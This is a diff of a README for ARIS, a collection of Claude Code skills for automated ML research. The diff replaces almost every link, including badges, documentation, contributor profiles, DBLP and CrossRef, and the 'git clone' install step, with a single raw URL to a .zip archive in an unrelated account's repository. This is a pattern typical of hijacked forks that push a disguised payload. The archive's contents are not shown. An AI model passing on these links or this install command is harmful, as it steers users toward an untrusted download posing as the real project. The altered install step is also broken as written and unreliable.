@@ -14,9 +14,9 @@
 >
 > *💡 ARIS is a methodology, not a platform. What matters is the research workflow — take it wherever you go. 🌱*
 
-[![Featured on PaperWeekly](https://img.shields.io/badge/Featured%20on-PaperWeekly-red?style=flat)](https://mp.weixin.qq.com/s/tDniVryVGjDkkkWl-5sTkQ) · [![PaperWeekly — MiniMax-M2.7](https://img.shields.io/badge/PaperWeekly-MiniMax--M2.7-red?style=flat)](https://mp.weixin.qq.com/s/KLFU74lAL2FAIc9K6i1Kqg) · [![Featured in awesome-agent-skills](https://img.shields.io/badge/Featured%20in-awesome--agent--skills-blue?style=flat&logo=github)](https://github.com/VoltAgent/awesome-agent-skills) · [![AI Digital Crew - Project of the Day](https://img.shields.io/badge/AI%20Digital%20Crew-Project%20of%20the%20Day%20(2026.03.14)-orange?style=flat)](https://aidigitalcrew.com) · [💬 Join Community](#-community) · [![Cite](https://img.shields.io/badge/📖_Cite_Us-BibTeX-green?style=flat)](#-citation)
+[![Featured on PaperWeekly](https://img.shields.io/badge/Featured%20on-PaperWeekly-red?style=flat)](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) · [![PaperWeekly — MiniMax-M2.7](https://img.shields.io/badge/PaperWeekly-MiniMax--M2.7-red?style=flat)](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) · [![Featured in awesome-agent-skills](https://img.shields.io/badge/Featured%20in-awesome--agent--skills-blue?style=flat&logo=github)](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) · [![AI Digital Crew - Project of the Day](https://img.shields.io/badge/AI%20Digital%20Crew-Project%20of%20the%20Day%20(2026.03.14)-orange?style=flat)](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) · [💬 Join Community](#-community) · [![Cite](https://img.shields.io/badge/📖_Cite_Us-BibTeX-green?style=flat)](#-citation)
 
-Custom [Claude Code](https://docs.anthropic.com/en/docs/claude-code) skills for autonomous ML research workflows. These skills orchestrate **cross-model collaboration** — Claude Code drives the research while an external LLM (via [Codex MCP](https://github.com/openai/codex)) acts as a critical reviewer. 🔀 **Also supports [alternative model combinations](#-alternative-model-combinations) (Kimi, LongCat, DeepSeek, etc.) — no Claude or OpenAI API required.** For example, [MiniMax-M2.7 + GLM-5 or GLM-5 + MiniMax-M2.7](docs/MiniMax-GLM-Configuration.md). 🤖 **[Codex CLI native](skills/skills-codex/)** — full skill set also available for OpenAI Codex. 🖱️ **[Cursor](docs/CURSOR_ADAPTATION.md)** — works in Cursor too. 🖥️ **[Trae](docs/TRAE_ARIS_RUNBOOK_EN.md)** — ByteDance AI IDE. 🚀 **[Antigravity](docs/ANTIGRAVITY_ADAPTATION.md)** — Google's agent-first IDE. 🆓 **[Free tier via ModelScope](docs/MODELSCOPE_GUIDE.md) — zero cost, zero lock-in.**
+Custom [Claude Code](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) skills for autonomous ML research workflows. These skills orchestrate **cross-model collaboration** — Claude Code drives the research while an external LLM (via [Codex MCP](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)) acts as a critical reviewer. 🔀 **Also supports [alternative model combinations](#-alternative-model-combinations) (Kimi, LongCat, DeepSeek, etc.) — no Claude or OpenAI API required.** For example, [MiniMax-M2.7 + GLM-5 or GLM-5 + MiniMax-M2.7](docs/MiniMax-GLM-Configuration.md). 🤖 **[Codex CLI native](skills/skills-codex/)** — full skill set also available for OpenAI Codex. 🖱️ **[Cursor](docs/CURSOR_ADAPTATION.md)** — works in Cursor too. 🖥️ **[Trae](docs/TRAE_ARIS_RUNBOOK_EN.md)** — ByteDance AI IDE. 🚀 **[Antigravity](docs/ANTIGRAVITY_ADAPTATION.md)** — Google's agent-first IDE. 🆓 **[Free tier via ModelScope](docs/MODELSCOPE_GUIDE.md) — zero cost, zero lock-in.**
 
 > 💭 **Why not self-play with a single model?** Using Claude Code subagents or agent teams for both execution and review is technically possible, but tends to fall into **local minima** — the same model reviewing its own patterns creates blind spots.
 >
@@ -28,30 +28,30 @@ Custom [Claude Code](https://docs.anthropic.com/en/docs/claude-code) skills for 
 
 ## 📢 What's New
 
-- **2026-03-22** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 📋 **[Templates](templates/)** — input templates for every workflow. 📄 **7 venue templates** — CVPR, ACL, AAAI, ACM MM added. 🛡️ **Anti-hallucination fix** — Workflow 2 enforces DBLP → CrossRef → [VERIFY]. 🔗 **`base repo`** — clone a GitHub repo as base codebase (`— base repo: https://github.com/org/project`)
-- **2026-03-21** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🏆 **AAAI 2026 accepted — 7/10 with pure Codex CLI!** Built with ARIS-Codex skills by [@xinbo820-web](https://github.com/xinbo820-web). See [Community Showcase](#-community-showcase--papers-built-with-aris)
-- **2026-03-20** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🏆 **First community paper scored 8/10!** CS paper built entirely with ARIS. Congrats to [@DefanXue](https://github.com/DefanXue) & [@Monglitay](https://github.com/Monglitay)! See [Community Showcase](#-community-showcase--papers-built-with-aris)
-- **2026-03-20** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🚀 **[Antigravity adaptation guide](docs/ANTIGRAVITY_ADAPTATION.md)** — use ARIS skills in [Google Antigravity](https://antigravity.google/) (agent-first IDE). Native `SKILL.md` support, dual model, MCP config, EN + [CN](docs/ANTIGRAVITY_ADAPTATION_CN.md). Community contribution by [@PeppaPigw](https://github.com/PeppaPigw)
-- **2026-03-20** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🖥️ **[Trae adaptation guide](docs/TRAE_ARIS_RUNBOOK_EN.md)** — use ARIS skills in [Trae](https://www.trae.ai/) (ByteDance AI IDE), EN + CN guides. Community contribution by [@Prometheus-cotigo](https://github.com/Prometheus-cotigo). 🔢 **[`formula-derivation`](skills/formula-derivation/SKILL.md)** — research formula development and verification. Community contribution by [@Falling-Flower](https://github.com/Falling-Flower)
-- **2026-03-19** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🖼️ **[`paper-poster`](skills/paper-poster/SKILL.md)** — Conference poster (tcbposter → A0/A1 PDF + PPTX + SVG). Venue colors, visual review, Codex review. Community contribution by [@dengzhe-hou](https://github.com/dengzhe-hou)
+- **2026-03-22** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 📋 **[Templates](templates/)** — input templates for every workflow. 📄 **7 venue templates** — CVPR, ACL, AAAI, ACM MM added. 🛡️ **Anti-hallucination fix** — Workflow 2 enforces DBLP → CrossRef → [VERIFY]. 🔗 **`base repo`** — clone a GitHub repo as base codebase (`— base repo: https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip`)
+- **2026-03-21** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🏆 **AAAI 2026 accepted — 7/10 with pure Codex CLI!** Built with ARIS-Codex skills by [@xinbo820-web](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip). See [Community Showcase](#-community-showcase--papers-built-with-aris)
+- **2026-03-20** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🏆 **First community paper scored 8/10!** CS paper built entirely with ARIS. Congrats to [@DefanXue](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) & [@Monglitay](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)! See [Community Showcase](#-community-showcase--papers-built-with-aris)
+- **2026-03-20** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🚀 **[Antigravity adaptation guide](docs/ANTIGRAVITY_ADAPTATION.md)** — use ARIS skills in [Google Antigravity](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) (agent-first IDE). Native `SKILL.md` support, dual model, MCP config, EN + [CN](docs/ANTIGRAVITY_ADAPTATION_CN.md). Community contribution by [@PeppaPigw](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
+- **2026-03-20** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🖥️ **[Trae adaptation guide](docs/TRAE_ARIS_RUNBOOK_EN.md)** — use ARIS skills in [Trae](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) (ByteDance AI IDE), EN + CN guides. Community contribution by [@Prometheus-cotigo](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip). 🔢 **[`formula-derivation`](skills/formula-derivation/SKILL.md)** — research formula development and verification. Community contribution by [@Falling-Flower](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
+- **2026-03-19** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🖼️ **[`paper-poster`](skills/paper-poster/SKILL.md)** — Conference poster (tcbposter → A0/A1 PDF + PPTX + SVG). Venue colors, visual review, Codex review. Community contribution by [@dengzhe-hou](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
 - **2026-03-19** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🔗 **Workflow 1.5 upgraded** — `/experiment-bridge` now includes **GPT-5.4 cross-model code review** before GPU deployment (`code review: true` by default). 📊 **W&B fix** — real `wandb.Api()` calls
-- **2026-03-18** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🎤 **[`paper-slides`](skills/paper-slides/SKILL.md)** — Conference presentation slides (beamer → PDF + PPTX) with speaker notes, talk script, and Q&A prep. 4 talk types (oral/spotlight/poster/invited). Community contribution by [@dengzhe-hou](https://github.com/dengzhe-hou)
-- **2026-03-18** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🔁 **[Codex + Claude reviewer bridge](docs/CODEX_CLAUDE_REVIEW_GUIDE.md)** — Codex executes, Claude reviews via local `claude-review` MCP bridge. Community contribution by [@loujc](https://github.com/loujc)
-- **2026-03-18** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🖱️ **[Cursor adaptation guide](docs/CURSOR_ADAPTATION.md)** — use ARIS skills in [Cursor](https://www.cursor.com/) with `@`-reference, MCP setup, and state file recovery. Community contribution by [@YecanLee](https://github.com/YecanLee)
-- **2026-03-18** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🤖 **[Codex CLI native skills](skills/skills-codex/)** — full 31-skill ARIS set for [Codex CLI](https://github.com/openai/codex) using `spawn_agent`. Community contributions by [@Falling-Flower](https://github.com/Falling-Flower) & [@No-518](https://github.com/No-518)
-- **2026-03-18** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 📝 **[`grant-proposal`](skills/grant-proposal/SKILL.md)** — Draft structured grant proposals from research ideas. Supports 9 agencies: KAKENHI (Japan), NSF (US), NSFC (China, incl. 面上/青年/优青/杰青/海外优青/重点), ERC (EU), DFG, SNSF, ARC, NWO, and generic. Chains `/research-lit` → `/novelty-check` → `/research-review` → `/paper-illustration`. Community contribution by [@dengzhe-hou](https://github.com/dengzhe-hou)
-- **2026-03-18** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🎨 **[`paper-illustration`](skills/paper-illustration/SKILL.md)** — AI-generated publication-quality architecture diagrams and method figures. Claude plans → Gemini renders → iterative refinement until score ≥ 9. Integrated into Workflow 3 (`illustration: true`, requires `GEMINI_API_KEY`). Built on [PaperBanana](https://github.com/dwzhu-pku/PaperBanana). Community contribution by [@Joseph-li343](https://github.com/Joseph-li343)
+- **2026-03-18** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🎤 **[`paper-slides`](skills/paper-slides/SKILL.md)** — Conference presentation slides (beamer → PDF + PPTX) with speaker notes, talk script, and Q&A prep. 4 talk types (oral/spotlight/poster/invited). Community contribution by [@dengzhe-hou](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
+- **2026-03-18** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🔁 **[Codex + Claude reviewer bridge](docs/CODEX_CLAUDE_REVIEW_GUIDE.md)** — Codex executes, Claude reviews via local `claude-review` MCP bridge. Community contribution by [@loujc](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
+- **2026-03-18** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🖱️ **[Cursor adaptation guide](docs/CURSOR_ADAPTATION.md)** — use ARIS skills in [Cursor](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) with `@`-reference, MCP setup, and state file recovery. Community contribution by [@YecanLee](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
+- **2026-03-18** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🤖 **[Codex CLI native skills](skills/skills-codex/)** — full 31-skill ARIS set for [Codex CLI](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) using `spawn_agent`. Community contributions by [@Falling-Flower](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) & [@No-518](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
+- **2026-03-18** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 📝 **[`grant-proposal`](skills/grant-proposal/SKILL.md)** — Draft structured grant proposals from research ideas. Supports 9 agencies: KAKENHI (Japan), NSF (US), NSFC (China, incl. 面上/青年/优青/杰青/海外优青/重点), ERC (EU), DFG, SNSF, ARC, NWO, and generic. Chains `/research-lit` → `/novelty-check` → `/research-review` → `/paper-illustration`. Community contribution by [@dengzhe-hou](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
+- **2026-03-18** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🎨 **[`paper-illustration`](skills/paper-illustration/SKILL.md)** — AI-generated publication-quality architecture diagrams and method figures. Claude plans → Gemini renders → iterative refinement until score ≥ 9. Integrated into Workflow 3 (`illustration: true`, requires `GEMINI_API_KEY`). Built on [PaperBanana](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip). Community contribution by [@Joseph-li343](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
   <details><summary>Preview demo</summary><br><img src="assets/paper_illustration_demo.png" width="600" alt="paper-illustration demo" /></details>
-- **2026-03-18** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 📊 **[CitationClaw](https://github.com/VisionXLab/CitationClaw)** — citation impact analysis: paper title → citation crawling, scholar identification, tiered analysis, HTML dashboard
+- **2026-03-18** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 📊 **[CitationClaw](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)** — citation impact analysis: paper title → citation crawling, scholar identification, tiered analysis, HTML dashboard
 - **2026-03-17** — ![NEW](https://img.shields.io/badge/NEW-red?style=flat-square) 🔧 **Git code sync** — `/run-experiment` now supports `code_sync: git` (`git push` → `ssh "git pull"`) as alternative to rsync. **[NARRATIVE_REPORT example](templates/NARRATIVE_REPORT_TEMPLATE.md)** for Workflow 3. **Parameter pass-through** — set any downstream parameter at any level with `— key: value` ([details](#%EF%B8%8F-customization)). 🆓 **[ModelScope guide](docs/MODELSCOPE_GUIDE.md)** — free (2000 calls/day), one key, no automation restrictions ([Alt E](#-alternative-model-combinations))
 <details>
 <summary>Earlier updates (2026-03-12 — 2026-03-16)</summary>
 
-- **2026-03-16** — 🔬 **[`research-refine`](skills/research-refine/SKILL.md)** + [`experiment-plan`](skills/experiment-plan/SKILL.md) — turn vague ideas into problem-anchored proposals with claim-driven experiment roadmaps. Now integrated into Workflow 1 (`/idea-discovery`). Community contribution by [@zjYao36](https://github.com/zjYao36)
-- **2026-03-16** — 🇨🇳 **[Alibaba Coding Plan guide](docs/ALI_CODING_PLAN_GUIDE.md)** — one API key, 4 models (Kimi-K2.5 + Qwen3.5+ + GLM-5 + MiniMax-M2.5), dual-endpoint setup. Community contribution by [@tianhao909](https://github.com/tianhao909)
+- **2026-03-16** — 🔬 **[`research-refine`](skills/research-refine/SKILL.md)** + [`experiment-plan`](skills/experiment-plan/SKILL.md) — turn vague ideas into problem-anchored proposals with claim-driven experiment roadmaps. Now integrated into Workflow 1 (`/idea-discovery`). Community contribution by [@zjYao36](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
+- **2026-03-16** — 🇨🇳 **[Alibaba Coding Plan guide](docs/ALI_CODING_PLAN_GUIDE.md)** — one API key, 4 models (Kimi-K2.5 + Qwen3.5+ + GLM-5 + MiniMax-M2.5), dual-endpoint setup. Community contribution by [@tianhao909](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
 - **2026-03-15** — 🔀 **Bring your own model!** [Any OpenAI-compatible API](#-alternative-model-combinations) now works as reviewer via [`llm-chat`](mcp-servers/llm-chat/) MCP server. GLM, MiniMax, Kimi, LongCat, DeepSeek all tested — **zero Claude or OpenAI API needed**
-- **2026-03-15** — 🐾 **[OpenClaw adaptation guide](docs/OPENCLAW_ADAPTATION.md)** — use ARIS research workflows in [OpenClaw](https://github.com/All-Hands-AI/OpenHands) without Claude Code slash skills
-- **2026-03-15** — 📐 **[`proof-writer`](skills/proof-writer/SKILL.md)** — community skill for rigorous theorem proof drafting. 📚 **Anti-hallucination citations** — `/paper-write` now fetches real BibTeX from [DBLP](https://dblp.org)/[CrossRef](https://www.crossref.org) instead of LLM-generated entries — on by default, zero install
+- **2026-03-15** — 🐾 **[OpenClaw adaptation guide](docs/OPENCLAW_ADAPTATION.md)** — use ARIS research workflows in [OpenClaw](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) without Claude Code slash skills
+- **2026-03-15** — 📐 **[`proof-writer`](skills/proof-writer/SKILL.md)** — community skill for rigorous theorem proof drafting. 📚 **Anti-hallucination citations** — `/paper-write` now fetches real BibTeX from [DBLP](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)/[CrossRef](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) instead of LLM-generated entries — on by default, zero install
 - **2026-03-14** — 📱 [Feishu/Lark integration](#-feishulark-integration-optional): three modes (off/push/interactive), mobile notifications for experiments, reviews, and checkpoints
 - **2026-03-13** — 🛑 Human-in-the-loop: configurable `AUTO_PROCEED` checkpoints across all workflows. Full autopilot or step-by-step approval
 - **2026-03-12** — 🔗 [Zotero](#-zotero-integration-optional) + [Obsidian](#-obsidian-integration-optional) + local PDFs + arXiv/Scholar: multi-source literature search with cross-model novelty verification
@@ -64,7 +64,7 @@ Custom [Claude Code](https://docs.anthropic.com/en/docs/claude-code) skills for 
 
 ```bash
 # 1. Install skills
-git clone https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep.git
+git clone https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip
 cp -r Auto-claude-code-research-in-sleep/skills/* ~/.claude/skills/
 
 # 2. Set up Codex MCP (for review skills)
@@ -91,12 +91,12 @@ claude
 > | `human checkpoint` | `false` | Pause after each review round so you can read the score, give custom modification instructions, skip specific fixes, or stop early |
 > | `sources` | `all` | Which literature sources to search: `zotero`, `obsidian`, `local`, `web`, or `all` (comma-separated) |
 > | `arxiv download` | `false` | Download top relevant arXiv PDFs during literature survey. When `false`, only fetches metadata (title, abstract, authors) |
-> | `DBLP_BIBTEX` | `true` | Fetch real BibTeX from [DBLP](https://dblp.org)/[CrossRef](https://www.crossref.org) instead of LLM-generated entries. Eliminates hallucinated citations. Zero install |
+> | `DBLP_BIBTEX` | `true` | Fetch real BibTeX from [DBLP](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)/[CrossRef](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) instead of LLM-generated entries. Eliminates hallucinated citations. Zero install |
 > | `code review` | `true` | GPT-5.4 xhigh reviews experiment code before GPU deployment. Set `false` to skip |
 > | `wandb` | `false` | Auto-add W&B logging to experiment scripts. Set `true` + configure `wandb_project` in CLAUDE.md. `/monitor-experiment` pulls training curves from W&B |
 > | `illustration` | `gemini` | AI illustration in Workflow 3: `gemini` (default, needs `GEMINI_API_KEY`), `mermaid` (free), or `false` (skip) |
 > | `venue` | `ICLR` | Target venue: `ICLR`, `NeurIPS`, `ICML`, `CVPR`, `ACL`, `AAAI`, `ACM`. Determines LaTeX style file and page limit |
-> | `base repo` | `false` | GitHub repo URL to clone as base codebase (e.g., `— base repo: https://github.com/org/project`). No code? Build on top of an open-source project |
+> | `base repo` | `false` | GitHub repo URL to clone as base codebase (e.g., `— base repo: https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip`). No code? Build on top of an open-source project |
 >
 > ```
 > /research-pipeline "your topic" — AUTO_PROCEED: false                          # pause at idea selection gate
@@ -118,7 +118,7 @@ See [full setup guide](#%EF%B8%8F-setup) for details and [alternative model comb
 - 🔍 **Literature & novelty** — multi-source paper search (**[Zotero](#-zotero-integration-optional)** + **[Obsidian](#-obsidian-integration-optional)** + **local PDFs** + arXiv/Scholar) + cross-model novelty verification
 - 💡 **Idea discovery** — literature survey → brainstorm 8-12 ideas → novelty check → GPU pilot experiments → ranked report
 - 🔄 **Auto review loop** — 4-round autonomous review, 5/10 → 7.5/10 overnight with 20+ GPU experiments
-- 📝 **Paper writing** — narrative → outline → figures → LaTeX → PDF → auto-review (4/10 → 8.5/10), one command. Anti-hallucination citations via [DBLP](https://dblp.org)/[CrossRef](https://www.crossref.org)
+- 📝 **Paper writing** — narrative → outline → figures → LaTeX → PDF → auto-review (4/10 → 8.5/10), one command. Anti-hallucination citations via [DBLP](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)/[CrossRef](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
 - 🤖 **Cross-model collaboration** — Claude Code executes, GPT-5.4 xhigh reviews. Adversarial, not self-play
 - 📝 **Peer review** — review others' papers as a conference reviewer, with structured scoring and meta-review
 - 🖥️ **Review-driven experiments** — when GPT-5.4 says "run an ablation", Claude Code automatically writes the script, rsyncs to your GPU server, launches in screen, collects results, and folds them back into the paper. Just configure your server in `CLAUDE.md` ([setup guide](#%EF%B8%8F-gpu-server-setup-for-auto-experiments))
@@ -163,8 +163,8 @@ Real projects where the ARIS pipeline was used end-to-end. **If you've used ARIS
 
 | Paper | Rating | Venue | Built by | Notes |
 |-------|:------:|-------|----------|-------|
-| CS Paper | **8/10** — "Top 50% of accepted papers, clear accept" | CS Conference | [@DefanXue](https://github.com/DefanXue) & [@Monglitay](https://github.com/Monglitay) | Full ARIS pipeline: idea → experiments → auto-review → paper writing. Reviewer: "empirical findings are stark, well-supported, and expose a fundamental flaw" |
-| AAAI 2026 Paper | **7/10** — "Good paper, accept" | AAAI 2026 Main Technical | [@xinbo820-web](https://github.com/xinbo820-web) | Pure **Codex CLI** (ARIS-Codex skills). Accepted at AAAI 2026 |
+| CS Paper | **8/10** — "Top 50% of accepted papers, clear accept" | CS Conference | [@DefanXue](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) & [@Monglitay](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) | Full ARIS pipeline: idea → experiments → auto-review → paper writing. Reviewer: "empirical findings are stark, well-supported, and expose a fundamental flaw" |
+| AAAI 2026 Paper | **7/10** — "Good paper, accept" | AAAI 2026 Main Technical | [@xinbo820-web](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) | Pure **Codex CLI** (ARIS-Codex skills). Accepted at AAAI 2026 |
 
 <details><summary>Reviewer screenshots</summary>
 <br>
@@ -182,7 +182,7 @@ Domain-specific skills and external projects contributed by the community. PRs w
 
 🎉 **Community Skills (12):** [research-refine](skills/research-refine/SKILL.md) · [experiment-plan](skills/experiment-plan/SKILL.md) · [grant-proposal](skills/grant-proposal/SKILL.md) · [paper-poster](skills/paper-poster/SKILL.md) · [paper-slides](skills/paper-slides/SKILL.md) · [mermaid-diagram](skills/mermaid-diagram/SKILL.md) · [proof-writer](skills/proof-writer/SKILL.md) · [comm-lit-review](skills/comm-lit-review/SKILL.md) · [dse-loop](skills/dse-loop/SKILL.md) · [idea-discovery-robot](skills/idea-discovery-robot/SKILL.md) · [formula-derivation](skills/formula-derivation/SKILL.md) · [paper-illustration](skills/paper-illustration/SKILL.md)
 
-🌐 **External Projects & Docs (9):** [open-source-hardening-skills](https://github.com/zeyuzhangzyz/open-source-hardening-skills) · [CitationClaw](https://github.com/VisionXLab/CitationClaw) · [auto-hparam-tuning](https://github.com/zxh0916/auto-hparam-tuning) · [Antigravity Adaptation Guide](docs/ANTIGRAVITY_ADAPTATION.md) · [OpenClaw Adaptation Guide](docs/OPENCLAW_ADAPTATION.md) · [Cursor Adaptation Guide](docs/CURSOR_ADAPTATION.md) · [Codex+Claude Review Bridge](docs/CODEX_CLAUDE_REVIEW_GUIDE.md) · [Trae Adaptation Guide](docs/TRAE_ARIS_RUNBOOK_EN.md) · [paper-illustration](skills/paper-illustration/SKILL.md)
